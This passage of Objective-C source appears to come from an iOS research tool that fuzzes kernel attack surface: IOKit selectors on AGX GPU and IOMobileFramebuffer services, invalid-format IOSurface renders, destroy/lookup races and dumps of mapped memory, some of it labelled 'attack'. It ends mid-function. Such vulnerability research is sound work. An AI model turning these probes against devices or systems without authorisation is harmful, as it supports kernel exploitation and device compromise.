                            size_t structOutSz = sizeof(structOut);
                            scalarOutCnt = 8;
                            memset(scalarOut, 0, sizeof(scalarOut));
                            skr = sym.call(conn, sel,
                                NULL, 0, structIn, sizeof(structIn),
                                scalarOut, &scalarOutCnt, structOut, &structOutSz);

                            if (skr == KERN_SUCCESS) {
                                selectorsAccepted++;
                                BOOL hasData = NO;
                                for (size_t i = 0; i < structOutSz && i < 64; i++) {
                                    if (structOut[i] != 0) { hasData = YES; break; }
                                }
                                if (hasData) {
                                    NSMutableString *hex = [NSMutableString new];
                                    for (size_t i = 0; i < MIN(structOutSz, (size_t)32); i++) {
                                        [hex appendFormat:@"%02x", structOut[i]];
                                        if ((i + 1) % 8 == 0) [hex appendString:@" "];
                                    }
                                    log([NSString stringWithFormat:
                                        @"AGX: DATA '%s' sel=%u structOut[%zu]: %@",
                                        gpuServices[si], sel, structOutSz, hex]);
                                    anomalies++;
                                }
                            }

                            // Detect unexpected codes
                            if (skr != KERN_SUCCESS &&
                                skr != KERN_INVALID_ARGUMENT &&
                                skr != KERN_NOT_SUPPORTED &&
                                skr != 0xe00002c2 &&
                                skr != 0xe00002bc &&
                                skr != 0xe00002be &&
                                skr != 0xe0000001 &&
                                skr != 0xe00002cd)
                            {
                                anomalies++;
                                log([NSString stringWithFormat:
                                    @"AGX: UNUSUAL_KR '%s' type=%u sel=%u kr=0x%08x",
                                    gpuServices[si], ct, sel, (unsigned)skr]);
                            }
                        }

                        sym.close(conn);
                    }
                }
                sym.release(svc);
            }

            // Phase B: IORegistryEntry property dump for found GPU services
            log(@"AGX: Phase B — registry property extraction via IOSurface side-channel");

            // Use IOSurface with GPU-hint properties to probe kernel behavior
            NSDictionary *gpuHintSurface = @{
                @"IOSurfaceWidth": @256,
                @"IOSurfaceHeight": @256,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @1024,
                @"IOSurfaceAllocSize": @(1024 * 256),
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceCacheMode": @1,        // kIOMapWriteCombineCache
                @"IOSurfaceIsGlobal": @YES,
            };
            IOSurfaceRef gpuSurf = sym.create((__bridge CFDictionaryRef)gpuHintSurface);
            if (gpuSurf) {
                IOSurfaceID gid = sym.getID(gpuSurf);
                size_t galloc = sym.getAllocSize(gpuSurf);
                log([NSString stringWithFormat:
                    @"AGX: GPU-hint surface created id=%u alloc=%zu (isGlobal requested)",
                    gid, galloc]);

                // Check if isGlobal actually took effect — try lookup
                IOSurfaceRef looked = sym.lookup(gid);
                if (looked) {
                    log(@"AGX: Global surface lookup succeeded (expected for same process)");
                    CFRelease(looked);
                }

                // Try different cache modes
                uint32_t cacheModes[] = {0, 1, 2, 3, 4, 5};
                for (int ci = 0; ci < 6 && !isr_stopped(); ci++) {
                    NSDictionary *cp = @{
                        @"IOSurfaceWidth": @64,
                        @"IOSurfaceHeight": @64,
                        @"IOSurfaceBytesPerElement": @4,
                        @"IOSurfaceBytesPerRow": @256,
                        @"IOSurfaceAllocSize": @(256 * 64),
                        @"IOSurfacePixelFormat": @(0x42475241),
                        @"IOSurfaceCacheMode": @(cacheModes[ci]),
                    };
                    IOSurfaceRef cs = sym.create((__bridge CFDictionaryRef)cp);
                    if (cs) {
                        log([NSString stringWithFormat:
                            @"AGX: cacheMode=%u ACCEPTED alloc=%zu", cacheModes[ci], sym.getAllocSize(cs)]);

                        // Write+read to check if cache mode changes memory behavior
                        sym.lock(cs, 0, NULL);
                        void *base = sym.getBase(cs);
                        if (base) {
                            volatile uint32_t *p = (volatile uint32_t *)base;
                            p[0] = 0xDEADBEEF;
                            __sync_synchronize();
                            uint32_t readback = p[0];
                            if (readback != 0xDEADBEEF) {
                                anomalies++;
                                log([NSString stringWithFormat:
                                    @"AGX: ANOMALY cacheMode=%u write/read mismatch: wrote 0xDEADBEEF read 0x%08x",
                                    cacheModes[ci], readback]);
                            }
                        }
                        sym.unlock(cs, 0, NULL);
                        CFRelease(cs);
                    } else {
                        log([NSString stringWithFormat:@"AGX: cacheMode=%u REJECTED", cacheModes[ci]]);
                    }
                }
                CFRelease(gpuSurf);
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"AGX: DONE services=%u connections=%u selectors=%u anomalies=%u elapsed=%.3fs",
                servicesFound, connectionsOpened, selectorsAccepted, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"servicesFound": @(servicesFound),
                @"connectionsOpened": @(connectionsOpened),
                @"selectorsAccepted": @(selectorsAccepted),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-AGX-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 11: Format Corruption Render (Round 3)

void iosurface_research_format_render(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"FMTRENDER: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"FMTRENDER: === Format Corruption + CoreGraphics Render ===");
            log(@"FMTRENDER: Creates surfaces with invalid formats, renders via CGBitmapContext");

            uint32_t anomalies = 0;
            uint32_t renderSuccess = 0;
            uint32_t renderFail = 0;
            uint32_t dataLeaks = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // dlsym CoreGraphics functions
            void *cg = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
                              RTLD_LAZY | RTLD_LOCAL);
            if (!cg) {
                log(@"FMTRENDER: ERROR — failed to load CoreGraphics");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef CGColorSpaceRef (*CGColorSpaceCreateFn)(void);
            typedef CGContextRef (*CGBitmapContextCreateFn)(void *, size_t, size_t, size_t, size_t,
                                                             CGColorSpaceRef, uint32_t);
            typedef void (*CGContextReleaseFn)(CGContextRef);
            typedef void (*CGColorSpaceReleaseFn)(CGColorSpaceRef);
            typedef CGImageRef (*CGBitmapContextCreateImageFn)(CGContextRef);
            typedef void (*CGImageReleaseFn)(CGImageRef);
            typedef void (*CGContextSetRGBFillColorFn)(CGContextRef, CGFloat, CGFloat, CGFloat, CGFloat);
            typedef void (*CGContextFillRectFn)(CGContextRef, CGRect);

            CGColorSpaceCreateFn cgCreateSRGB = (CGColorSpaceCreateFn)dlsym(cg, "CGColorSpaceCreateDeviceRGB");
            CGBitmapContextCreateFn cgBitmapCreate = (CGBitmapContextCreateFn)dlsym(cg, "CGBitmapContextCreate");
            CGContextReleaseFn cgCtxRelease = (CGContextReleaseFn)dlsym(cg, "CGContextRelease");
            CGColorSpaceReleaseFn cgCSRelease = (CGColorSpaceReleaseFn)dlsym(cg, "CGColorSpaceRelease");
            CGBitmapContextCreateImageFn cgCreateImage = (CGBitmapContextCreateImageFn)dlsym(cg, "CGBitmapContextCreateImage");
            CGImageReleaseFn cgImgRelease = (CGImageReleaseFn)dlsym(cg, "CGImageRelease");
            CGContextSetRGBFillColorFn cgSetFill = (CGContextSetRGBFillColorFn)dlsym(cg, "CGContextSetRGBFillColor");
            CGContextFillRectFn cgFillRect = (CGContextFillRectFn)dlsym(cg, "CGContextFillRect");

            if (!cgCreateSRGB || !cgBitmapCreate || !cgCtxRelease || !cgCSRelease) {
                log(@"FMTRENDER: ERROR — CoreGraphics symbols missing");
                dlclose(cg);
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            CGColorSpaceRef cs = cgCreateSRGB();

            // Test matrix: create IOSurface with format X, then attempt CGBitmapContext on its buffer
            struct {
                uint32_t format;
                uint32_t cgBitmapInfo;
                const char *label;
            } tests[] = {
                { 0x42475241, 1 | (2 << 12), "BGRA_premul" },           // normal
                { 0x00000000, 1 | (2 << 12), "zero_fmt_premul" },       // zero format
                { 0xFFFFFFFF, 1 | (2 << 12), "max_fmt_premul" },        // max format
                { 0x42475241, 0,              "BGRA_none" },              // no alpha
                { 0x42475241, 6 | (2 << 12), "BGRA_float" },            // float components
                { 0x00000001, 1 | (2 << 12), "tiny_fmt_premul" },       // format=1
                { 0x80000000, 1 | (2 << 12), "highbit_fmt_premul" },    // high bit
                { 0x42475241, 1 | (3 << 12), "BGRA_premul_first" },     // alphaFirst
                { 0x42475241, 2 | (2 << 12), "BGRA_last_premul" },      // alphaLast+premul
            };
            int nTests = sizeof(tests) / sizeof(tests[0]);

            size_t w = 64, h = 64, bpr = w * 4;

            for (int ti = 0; ti < nTests && !isr_stopped(); ti++) {
                isr_checkpoint(@"ISR-FmtRender-checkpoint.json", @{
                    @"test": @(tests[ti].label), @"anomalies": @(anomalies)
                });

                NSDictionary *params = @{
                    @"IOSurfaceWidth": @(w),
                    @"IOSurfaceHeight": @(h),
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfaceBytesPerRow": @(bpr),
                    @"IOSurfaceAllocSize": @(bpr * h),
                    @"IOSurfacePixelFormat": @(tests[ti].format),
                };
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)params);
                if (!surf) {
                    log([NSString stringWithFormat:@"FMTRENDER: '%s' surface creation failed", tests[ti].label]);
                    continue;
                }

                // Write sentinel pattern to IOSurface buffer
                sym.lock(surf, 0, NULL);
                void *base = sym.getBase(surf);
                if (base) {
                    memset(base, 0xCC, bpr * h);
                }
                sym.unlock(surf, 0, NULL);

                // Create CGBitmapContext on the IOSurface's buffer
                sym.lock(surf, 0, NULL);
                base = sym.getBase(surf);
                CGContextRef ctx = NULL;
                BOOL renderOK = NO;

                if (base) {
                    ctx = cgBitmapCreate(base, w, h, 8, bpr, cs, tests[ti].cgBitmapInfo);
                    if (ctx) {
                        renderSuccess++;
                        renderOK = YES;

                        // Draw something via CoreGraphics
                        if (cgSetFill && cgFillRect) {
                            cgSetFill(ctx, 1.0, 0.0, 0.0, 1.0); // red
                            cgFillRect(ctx, CGRectMake(0, 0, w, h));
                        }

                        // Create image to force render pipeline
                        if (cgCreateImage) {
                            CGImageRef img = cgCreateImage(ctx);
                            if (img) {
                                if (cgImgRelease) cgImgRelease(img);
                            }
                        }

                        // Check if the buffer was actually modified by CG
                        uint8_t *p = (uint8_t *)base;
                        int ccCount = 0;
                        for (size_t i = 0; i < MIN(bpr * h, (size_t)1024); i++) {
                            if (p[i] == 0xCC) ccCount++;
                        }
                        double sentinel_ratio = (double)ccCount / MIN(bpr * h, (size_t)1024);

                        if (sentinel_ratio > 0.9) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"FMTRENDER: ANOMALY '%s' — CG accepted context but did NOT modify buffer (%.0f%% sentinel intact)",
                                tests[ti].label, sentinel_ratio * 100]);
                        } else {
                            log([NSString stringWithFormat:
                                @"FMTRENDER: '%s' rendered OK (%.0f%% sentinel overwritten)",
                                tests[ti].label, (1.0 - sentinel_ratio) * 100]);
                        }

                        cgCtxRelease(ctx);
                    } else {
                        renderFail++;
                        log([NSString stringWithFormat:
                            @"FMTRENDER: '%s' CGBitmapContext creation failed", tests[ti].label]);
                    }
                }
                sym.unlock(surf, 0, NULL);

                // Phase 2: Check if unreleased IOSurface with active CG render causes issues
                // Create a second surface, render to it, then lookup the first by ID
                if (renderOK) {
                    IOSurfaceID sid = sym.getID(surf);
                    IOSurfaceRef lookup = sym.lookup(sid);
                    if (lookup) {
                        sym.lock(lookup, 3, NULL); // read only
                        void *lbase = sym.getBase(lookup);
                        if (lbase && base) {
                            // Compare: lookup buffer should match original after CG render
                            if (memcmp(base, lbase, MIN((size_t)256, bpr * h)) != 0) {
                                anomalies++;
                                dataLeaks++;
                                log([NSString stringWithFormat:
                                    @"FMTRENDER: ANOMALY '%s' — lookup buffer differs from original after render!",
                                    tests[ti].label]);
                            }
                        }
                        sym.unlock(lookup, 0, NULL);
                        CFRelease(lookup);
                    }
                }

                CFRelease(surf);
            }

            if (cs) cgCSRelease(cs);
            dlclose(cg);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"FMTRENDER: DONE rendered=%u failed=%u dataLeaks=%u anomalies=%u elapsed=%.3fs",
                renderSuccess, renderFail, dataLeaks, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"renderSuccess": @(renderSuccess),
                @"renderFail": @(renderFail),
                @"dataLeaks": @(dataLeaks),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-FmtRender-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 12: Cross-Reference Attack (Round 3)

void iosurface_research_xref_attack(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"XREF: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"XREF: === Cross-Reference Property Confusion Attack ===");
            log(@"XREF: Tests if kernel trusts cached surface metadata across connections");

            uint32_t anomalies = 0;
            uint32_t confusionHits = 0;
            uint32_t timingHits = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            // Phase A: Property confusion — create surface, lookup, check if properties match
            log(@"XREF: Phase A — property confusion via lookup");

            struct {
                size_t w, h;
                const char *label;
            } surfacePairs[] = {
                { 64, 64, "small" },
                { 512, 512, "medium" },
                { 1024, 1, "wide_thin" },
                { 1, 1024, "narrow_tall" },
                { 131071, 1, "max_width" },
            };
            int nPairs = sizeof(surfacePairs) / sizeof(surfacePairs[0]);

            for (int pi = 0; pi < nPairs && !isr_stopped(); pi++) {
                isr_checkpoint(@"ISR-Xref-checkpoint.json", @{
                    @"phase": @"A", @"pair": @(surfacePairs[pi].label)
                });

                size_t w = surfacePairs[pi].w, h = surfacePairs[pi].h;
                NSDictionary *params = isr_default_surface_params(w, h);
                IOSurfaceRef creator = sym.create((__bridge CFDictionaryRef)params);
                if (!creator) {
                    log([NSString stringWithFormat:@"XREF: '%s' creation failed", surfacePairs[pi].label]);
                    continue;
                }

                IOSurfaceID sid = sym.getID(creator);
                size_t cw = sym.getWidth(creator);
                size_t ch = sym.getHeight(creator);
                size_t calloc = sym.getAllocSize(creator);

                // Lookup from "another context" (same process, different reference)
                IOSurfaceRef looked = sym.lookup(sid);
                if (!looked) {
                    log([NSString stringWithFormat:@"XREF: '%s' lookup failed", surfacePairs[pi].label]);
                    CFRelease(creator);
                    continue;
                }

                size_t lw = sym.getWidth(looked);
                size_t lh = sym.getHeight(looked);
                size_t lalloc = sym.getAllocSize(looked);

                BOOL confused = (cw != lw || ch != lh || calloc != lalloc);
                if (confused) {
                    confusionHits++;
                    anomalies++;
                    log([NSString stringWithFormat:
                        @"XREF: CONFUSION '%s' creator=%zux%zu(%zu) lookup=%zux%zu(%zu)",
                        surfacePairs[pi].label, cw, ch, calloc, lw, lh, lalloc]);
                } else {
                    log([NSString stringWithFormat:
                        @"XREF: '%s' consistent %zux%zu alloc=%zu", surfacePairs[pi].label, lw, lh, lalloc]);
                }

                // Phase A.2: Write via creator, read via lookup — check coherency
                sym.lock(creator, 0, NULL);
                void *cbase = sym.getBase(creator);
                if (cbase) {
                    memset(cbase, 0x42, MIN(calloc, (size_t)4096));
                }
                sym.unlock(creator, 0, NULL);

                sym.lock(looked, 3, NULL);
                void *lbase = sym.getBase(looked);
                if (lbase && cbase) {
                    uint8_t *p = (uint8_t *)lbase;
                    int match = 0;
                    size_t check = MIN(lalloc, (size_t)4096);
                    for (size_t i = 0; i < check; i++) {
                        if (p[i] == 0x42) match++;
                    }
                    double ratio = (double)match / check;
                    if (ratio < 0.9) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"XREF: ANOMALY '%s' — lookup reads only %.0f%% of creator's writes!",
                            surfacePairs[pi].label, ratio * 100]);
                    }
                }
                sym.unlock(looked, 0, NULL);

                CFRelease(looked);
                CFRelease(creator);
            }

            // Phase B: Race between destroy and lookup — try to catch stale metadata
            log(@"XREF: Phase B — destroy/lookup race for stale metadata");
            uint32_t raceTrials = 500;
            uint32_t staleMetadata = 0;

            for (uint32_t t = 0; t < raceTrials && !isr_stopped(); t++) {
                NSDictionary *params = isr_default_surface_params(128, 128);
                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                if (!s) continue;

                IOSurfaceID sid = sym.getID(s);
                size_t origW = sym.getWidth(s);

                // Release creator
                CFRelease(s);

                // Immediately create a DIFFERENT sized surface hoping to reuse the ID
                NSDictionary *params2 = isr_default_surface_params(256, 32);
                IOSurfaceRef s2 = sym.create((__bridge CFDictionaryRef)params2);
                if (!s2) continue;

                IOSurfaceID sid2 = sym.getID(s2);

                if (sid2 == sid) {
                    // Same ID reused — check if lookup returns new or stale dimensions
                    IOSurfaceRef looked2 = sym.lookup(sid);
                    if (looked2) {
                        size_t lookW = sym.getWidth(looked2);
                        size_t s2W = sym.getWidth(s2);

                        if (lookW != s2W) {
                            staleMetadata++;
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"XREF: STALE trial=%u id=%u lookup_w=%zu expected=%zu orig=%zu",
                                t, sid, lookW, s2W, origW]);
                        }
                        CFRelease(looked2);
                    }
                    timingHits++;
                }
                CFRelease(s2);
            }

            log([NSString stringWithFormat:
                @"XREF: Phase B — %u/%u ID reuses, %u stale metadata hits",
                timingHits, raceTrials, staleMetadata]);

            // Phase C: Concurrent lookup + property read race
            log(@"XREF: Phase C — concurrent lookup/property-read race");
            __block _Atomic uint32_t propRaceAnomalies = 0;
            NSDictionary *raceParams = isr_default_surface_params(64, 64);
            IOSurfaceRef raceSurf = sym.create((__bridge CFDictionaryRef)raceParams);

            if (raceSurf) {
                IOSurfaceID raceID = sym.getID(raceSurf);
                dispatch_group_t group = dispatch_group_create();
                dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);

                for (int thread = 0; thread < 4; thread++) {
                    dispatch_group_async(group, q, ^{
                        for (int i = 0; i < 1000 && !isr_stopped(); i++) {
                            IOSurfaceRef l = sym.lookup(raceID);
                            if (l) {
                                size_t rw = sym.getWidth(l);
                                size_t rh = sym.getHeight(l);
                                if (rw != 64 || rh != 64) {
                                    atomic_fetch_add_explicit(&propRaceAnomalies, 1, memory_order_relaxed);
                                }
                                CFRelease(l);
                            }
                        }
                    });
                }

                dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
                CFRelease(raceSurf);

                if (propRaceAnomalies > 0) {
                    anomalies += propRaceAnomalies;
                    log([NSString stringWithFormat:
                        @"XREF: ANOMALY Phase C — %u property inconsistencies during concurrent lookup",
                        propRaceAnomalies]);
                } else {
                    log(@"XREF: Phase C — 4000 concurrent lookups, properties consistent");
                }
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"XREF: DONE confusion=%u staleMetadata=%u propRace=%u anomalies=%u elapsed=%.3fs",
                confusionHits, staleMetadata, propRaceAnomalies, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"confusionHits": @(confusionHits),
                @"staleMetadata": @(staleMetadata),
                @"propRaceAnomalies": @(propRaceAnomalies),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-Xref-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 13: IOMobileFramebuffer Deep Scan (Round 4)

void iosurface_research_framebuffer(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"FB: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"FB: === IOMobileFramebuffer Deep Scanner ===");
            log(@"FB: Round 3 found 8 connection types open — now fuzzing selectors on each");

            uint32_t anomalies = 0;
            uint32_t selectorsAccepted = 0;
            uint32_t dataReturned = 0;
            uint32_t unusualErrors = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            CFDictionaryRef m = sym.matching("IOMobileFramebuffer");
            if (!m) {
                log(@"FB: ERROR — service matching dict creation failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            io_service_t svc = sym.getMatch(MACH_PORT_NULL, m);
            if (!svc) {
                log(@"FB: ERROR — IOMobileFramebuffer service not found");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"FB: IOMobileFramebuffer service found");

            // Phase A: Selector fuzzing on all 8 connection types
            for (uint32_t ct = 0; ct <= 7 && !isr_stopped(); ct++) {
                isr_checkpoint(@"ISR-FB-checkpoint.json", @{
                    @"phase": @"A", @"connType": @(ct), @"accepted": @(selectorsAccepted)
                });

                io_connect_t conn = 0;
                kern_return_t kr = sym.open(svc, mach_task_self(), ct, &conn);

                if (kr != KERN_SUCCESS || !conn) {
                    log([NSString stringWithFormat:@"FB: type=%u connection failed kr=0x%08x", ct, (unsigned)kr]);
                    continue;
                }

                log([NSString stringWithFormat:@"FB: type=%u OPENED conn=0x%x — fuzzing selectors 0-50", ct, conn]);

                for (uint32_t sel = 0; sel <= 50 && !isr_stopped(); sel++) {
                    // Pattern 1: Empty call
                    uint64_t scalarOut[16] = {};
                    uint32_t scalarOutCnt = 16;
                    kern_return_t skr = sym.call(conn, sel,
                        NULL, 0, NULL, 0,
                        scalarOut, &scalarOutCnt, NULL, NULL);

                    if (skr == KERN_SUCCESS) {
                        selectorsAccepted++;
                        NSMutableString *vals = [NSMutableString new];
                        for (uint32_t i = 0; i < scalarOutCnt && i < 8; i++) {
                            [vals appendFormat:@"0x%llx ", scalarOut[i]];
                        }
                        log([NSString stringWithFormat:
                            @"FB: ACCEPTED type=%u sel=%u outCnt=%u vals=[%@]",
                            ct, sel, scalarOutCnt, vals]);
                        if (scalarOutCnt > 0) dataReturned++;
                    }

                    // Pattern 2: Scalar inputs (0-3 scalars)
                    for (uint32_t nScalars = 1; nScalars <= 3 && !isr_stopped(); nScalars++) {
                        uint64_t scalarIn[3] = {0, 0, 0};
                        scalarOutCnt = 16;
                        memset(scalarOut, 0, sizeof(scalarOut));
                        skr = sym.call(conn, sel,
                            scalarIn, nScalars, NULL, 0,
                            scalarOut, &scalarOutCnt, NULL, NULL);

                        if (skr == KERN_SUCCESS) {
                            selectorsAccepted++;
                            log([NSString stringWithFormat:
                                @"FB: ACCEPTED type=%u sel=%u nScIn=%u outCnt=%u",
                                ct, sel, nScalars, scalarOutCnt]);
                        }
                    }

                    // Pattern 3: Struct input — IOSurface ID as first field
                    NSDictionary *surfParams = isr_default_surface_params(64, 64);
                    IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)surfParams);
                    if (testSurf) {
                        IOSurfaceID surfID = sym.getID(testSurf);
                        uint8_t structIn[128] = {};
                        *(uint32_t *)structIn = surfID;
                        *(uint32_t *)(structIn + 4) = 64;  // width
                        *(uint32_t *)(structIn + 8) = 64;  // height
                        *(uint32_t *)(structIn + 12) = 0x42475241; // BGRA

                        uint8_t structOut[512] = {};
                        size_t structOutSz = sizeof(structOut);
                        scalarOutCnt = 16;
                        memset(scalarOut, 0, sizeof(scalarOut));

                        skr = sym.call(conn, sel,
                            NULL, 0, structIn, 64,
                            scalarOut, &scalarOutCnt, structOut, &structOutSz);

                        if (skr == KERN_SUCCESS) {
                            selectorsAccepted++;
                            BOOL hasData = NO;
                            for (size_t i = 0; i < structOutSz && i < 64; i++) {
                                if (structOut[i] != 0) { hasData = YES; break; }
                            }
                            if (hasData) {
                                dataReturned++;
                                NSMutableString *hex = [NSMutableString new];
                                for (size_t i = 0; i < MIN(structOutSz, (size_t)32); i++) {
                                    [hex appendFormat:@"%02x", structOut[i]];
                                    if ((i + 1) % 8 == 0) [hex appendString:@" "];
                                }
                                log([NSString stringWithFormat:
                                    @"FB: DATA type=%u sel=%u structOut[%zu]: %@",
                                    ct, sel, structOutSz, hex]);
                                anomalies++;
                            }
                        }
                        CFRelease(testSurf);
                    }

                    // Track unusual error codes
                    if (skr != KERN_SUCCESS &&
                        skr != KERN_INVALID_ARGUMENT &&
                        skr != KERN_NOT_SUPPORTED &&
                        skr != 0xe00002c2 &&
                        skr != 0xe00002bc &&
                        skr != 0xe00002be &&
                        skr != 0xe0000001 &&
                        skr != 0xe00002cd)
                    {
                        unusualErrors++;
                        if (unusualErrors <= 20) {
                            log([NSString stringWithFormat:
                                @"FB: UNUSUAL type=%u sel=%u kr=0x%08x",
                                ct, sel, (unsigned)skr]);
                        }
                    }
                }

                sym.close(conn);
            }

            // Phase B: Try to pass IOSurface to framebuffer via IOConnectMapMemory
            log(@"FB: Phase B — IOConnectMapMemory probing");
            typedef kern_return_t (*IOConnectMapMemoryFn)(io_connect_t, uint32_t, task_port_t,
                mach_vm_address_t *, mach_vm_size_t *, uint32_t);
            void *iokitLib = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
            IOConnectMapMemoryFn mapMem = NULL;
            if (iokitLib) {
                mapMem = (IOConnectMapMemoryFn)dlsym(iokitLib, "IOConnectMapMemory64");
            }

            if (mapMem) {
                for (uint32_t ct = 0; ct <= 3 && !isr_stopped(); ct++) {
                    io_connect_t conn = 0;
                    kern_return_t kr = sym.open(svc, mach_task_self(), ct, &conn);
                    if (kr != KERN_SUCCESS || !conn) continue;

                    for (uint32_t memType = 0; memType <= 10; memType++) {
                        mach_vm_address_t addr = 0;
                        mach_vm_size_t size = 0;
                        kr = mapMem(conn, memType, mach_task_self(), &addr, &size, 1);

                        if (kr == KERN_SUCCESS && addr && size) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"FB: MAPPED type=%u memType=%u addr=0x%llx size=%llu",
                                ct, memType, (unsigned long long)addr, (unsigned long long)size]);

                            // Check what's at the mapped address
                            uint8_t *p = (uint8_t *)(uintptr_t)addr;
                            NSMutableString *hex = [NSMutableString new];
                            for (size_t i = 0; i < MIN((size_t)size, (size_t)64); i++) {
                                [hex appendFormat:@"%02x", p[i]];
                                if ((i + 1) % 16 == 0) [hex appendString:@" "];
                            }
                            log([NSString stringWithFormat:@"FB: MAP_DATA: %@", hex]);
                        } else if (kr != KERN_NOT_SUPPORTED && kr != 0xe00002c2 && kr != KERN_INVALID_ARGUMENT) {
                            log([NSString stringWithFormat:
                                @"FB: mapMem type=%u memType=%u kr=0x%08x",
                                ct, memType, (unsigned)kr]);
                        }
                    }
                    sym.close(conn);
                }
            }
            if (iokitLib) dlclose(iokitLib);

            sym.release(svc);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:
                @"FB: DONE selectors=%u dataReturned=%u unusualErrs=%u anomalies=%u elapsed=%.3fs",
                selectorsAccepted, dataReturned, unusualErrors, anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"selectorsAccepted": @(selectorsAccepted),
                @"dataReturned": @(dataReturned),
                @"unusualErrors": @(unusualErrors),
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-FB-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 14: Format Mismatch Attack (Round 4)

void iosurface_research_format_mismatch(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"MISMATCH: ERROR — failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"MISMATCH: === Format Mismatch Attack ===");
            log(@"MISMATCH: IOSurface accepts ANY format — testing what happens downstream");

            uint32_t anomalies = 0;
            uint32_t memoryCorruption = 0;
            uint32_t oobReads = 0;
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

            void *cg = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
                              RTLD_LAZY | RTLD_LOCAL);
            if (!cg) {
                log(@"MISMATCH: ERROR — CoreGraphics load failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            typedef CGColorSpaceRef (*CGCSCreateFn)(void);
            typedef CGContextRef (*CGBCCreateFn)(void *, size_t, size_t, size_t, size_t,
                                                  CGColorSpaceRef, uint32_t);
            typedef void (*CGCtxRelFn)(CGContextRef);
            typedef void (*CGCSRelFn)(CGColorSpaceRef);
            typedef void (*CGCtxSetFillFn)(CGContextRef, CGFloat, CGFloat, CGFloat, CGFloat);
            typedef void (*CGCtxFillRectFn)(CGContextRef, CGRect);
            typedef CGImageRef (*CGBCCreateImgFn)(CGContextRef);
            typedef void (*CGImgRelFn)(CGImageRef);
            typedef size_t (*CGImgGetWFn)(CGImageRef);
            typedef size_t (*CGImgGetHFn)(CGImageRef);
            typedef size_t (*CGImgGetBPCFn)(CGImageRef);
            typedef size_t (*CGImgGetBPPFn)(CGImageRef);

            CGCSCreateFn csCreate = (CGCSCreateFn)dlsym(cg, "CGColorSpaceCreateDeviceRGB");
